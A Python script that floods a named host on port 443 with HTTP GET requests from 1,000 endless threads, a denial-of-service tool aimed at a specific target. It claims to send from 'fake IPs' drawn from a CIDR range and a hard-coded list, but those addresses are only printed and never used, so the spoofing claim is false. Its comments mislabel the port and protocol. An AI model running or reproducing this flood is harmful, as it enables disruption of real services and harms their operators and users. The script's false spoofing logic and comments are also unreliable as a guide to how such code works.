import socket
import random
import threading
import ipaddress
import time
import signal
import sys

# Define the target server and port
target = "tipi1.fly.dev"
port = 443  # HTTP typically uses port 80

# Define the CIDR subnet range
subnet = ipaddress.IPv4Network('114.120.0.0/13', strict=False)

# Define a list of fake IP addresses
fake_ips = ["20.205.61.143", "103.84.206.169", "101.37.18.10"]

# Function to generate fake IP addresses within the CIDR range
def generate_fake_ips(subnet, count):
    fake_ips = []
    for _ in range(count):
        fake_ip = str(random.choice(list(subnet.hosts())))
        fake_ips.append(fake_ip)
    return fake_ips

# Generate fake IPs within the CIDR range
generated_fake_ips = generate_fake_ips(subnet, 100)

# Function to send HTTP GET requests with a random fake IP
def send_request_with_random_fake_ip():
    while True:
        try:
            # Randomly select either from generated_fake_ips or fake_ips
            fake_ip = random.choice(generated_fake_ips + fake_ips)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            
            # Receive and discard the response
            response = s.recv(1000)
            
            s.close()
            
            print(f"Sent request with fake IP: {fake_ip}")
        except Exception as e:
            print("An error occurred:", str(e))

# Create and start threads for sending requests
threads = []
for _ in range(1000):
    thread = threading.Thread(target=send_request_with_random_fake_ip)
    thread.start()
    threads.append(thread)

# Function to handle SIGINT signal (Ctrl+C)
def signal_handler(sig, frame):
    print("Stopping the program...")
    # Wait for all threads to finish
    for thread in threads:
        thread.join()
    sys.exit(0)

# Register the signal handler
signal.signal(signal.SIGINT, signal_handler)

# Keep the program running
while True:
    time.sleep(0000000.1)
